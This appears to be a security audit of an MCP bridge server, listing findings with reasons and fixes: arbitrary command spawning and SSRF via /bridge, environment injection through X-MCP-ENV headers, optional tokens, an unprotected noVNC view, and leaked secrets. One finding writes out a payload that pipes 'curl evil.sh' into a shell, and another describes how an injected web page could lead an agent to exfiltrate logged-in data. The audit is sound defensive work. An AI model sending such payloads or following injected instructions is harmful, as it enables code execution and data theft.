reason: The bridge exposes fetch (untrusted web text and a way out) together with two servers driving the same non-isolated headful Chrome over CDP (logged-in sessions = private data), and the bridge adds no approval step; an injected instruction in a fetched page can make the agent read a logged-in site and send it out via fetch or navigation.
fix: Run the browser with an isolated, logged-out profile (--isolated=true), split fetch and browser servers across different agents, and require human approval for navigation/fetch to non-allowlisted hosts.

reason: verify=False is only used for an unauthenticated GET /health readiness probe to the self-signed sandbox; no token or data is sent and only the status code is used, so a MITM gains nothing beyond a wrong readiness answer.
fix: Optional hardening: pin the sandbox certificate or probe through the E2B-provided TLS endpoint.

title: /bridge spawns any command (and connects to any URL) taken from the HTTP request body

evidence.quote: const { serverPath, method, params, args, env } = req.body;

reason: POST /bridge with {"serverPath":"bash","args":["-c","curl evil.sh|sh"],"env":{...},"method":"ping","params":{}} runs an arbitrary program with arbitrary args/env on the host; an http(s)/ws URL instead makes the bridge connect to any internal address (SSRF). Only the optional shared bearer token stands in front of it.
fix: Remove free-form serverPath/args/env: let /bridge reference only server ids from mcp-servers.json (like /mcp/:serverId), or allowlist exact commands and reject request-supplied env.

title: X-MCP-ENV-* request headers override the environment of configured servers
reason: Any header X-MCP-ENV-<NAME> becomes an environment variable of the spawned npx/uvx server with no allowlist, so a caller of /mcp/:serverId can set NODE_OPTIONS (--import a data: module), NPM_CONFIG_REGISTRY / UV_INDEX_URL (install an attacker package for the unpinned @latest servers), PATH or LD_PRELOAD and get code execution, or override operator-set secrets such as N8N_API_URL to redirect credentials.
fix: Accept only an explicit per-server allowlist of overridable variable names (e.g. N8N_API_KEY) and never allow NODE_OPTIONS, PATH, LD_*, NPM_CONFIG_*, UV_*, PYTHON*.

title: Bearer token is optional and the server listens on all interfaces (optionally via ngrok)

evidence.quote: this.logger.warn('No AUTH_TOKEN environment variable set. This is a security risk.');

reason: With AUTH_TOKEN/ACCESS_TOKEN empty (the .env.example default) every request passes, the app binds all interfaces, and --tunnel publishes it through ngrok, so anyone who can reach it gets M001/M002 code execution; the Origin check is skipped when ALLOWED_ORIGINS is empty, leaving browsers/DNS rebinding open too.
fix: Refuse to start without a strong token, bind 127.0.0.1 by default, compare tokens with crypto.timingSafeEqual, and always validate Origin/Host for localhost use.

title: E2B deploy exposes noVNC of the headful browser without a password by default
reason: When VNC_PASSWORD is unset x11vnc runs with -nopw and nginx publishes noVNC at /novnc/ on the sandbox's public 443/80 ports without any auth, so anyone with the sandbox URL can watch and control the browser the agent uses.
fix: Require VNC_PASSWORD (fail startup if unset) and put the /novnc/ locations behind the same bearer-token check (auth_request) as the bridge.

title: Full tool-call arguments logged at INFO
reason: Every /bridge tools/call logs its full arguments (and line 195 logs the request body with only env masked), so credentials or personal data passed as tool arguments end up in logs.
fix: Log tool name and argument keys only, or redact values at debug level.

title: n8n-mcp wrapper runs an unpinned npx package with the full server environment
reason: npx n8n-mcp downloads whatever version is current and receives the whole environment (including AUTH_TOKEN / NGROK_AUTH_TOKEN if set), so a hijacked release gets those secrets.
fix: Pin n8n-mcp@<version> and pass only the variables it needs (N8N_API_URL, N8N_API_KEY).
